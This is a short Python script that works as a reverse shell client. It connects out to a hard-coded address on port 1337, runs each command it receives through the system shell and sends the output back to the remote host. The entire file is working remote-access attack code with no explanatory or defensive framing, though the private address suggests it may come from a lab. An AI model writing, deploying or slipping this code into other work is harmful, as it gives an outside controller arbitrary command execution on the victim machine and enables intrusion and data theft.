import socket
import subprocess
import os

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    IP = "10.6.6.88"
    PORT = 1337

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((IP, PORT))

        while True:
            command = client_socket.recv(1024).decode()
            
            if command == "stop":
                break

            elif command.startswith("cd"):
                try:
                    os.chdir(command.split(" ", 1)[1])
                    client_socket.send(IDENTIFIER.encode())
                except Exception as e:
                    client_socket.send(f"Error changing directory: {e}{IDENTIFIER}".encode())

            else:
                try:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    result = stdout + stderr
                    client_socket.send(result + IDENTIFIER.encode())
                except Exception as e:
                    client_socket.send(f"Command execution error: {e}{IDENTIFIER}".encode())
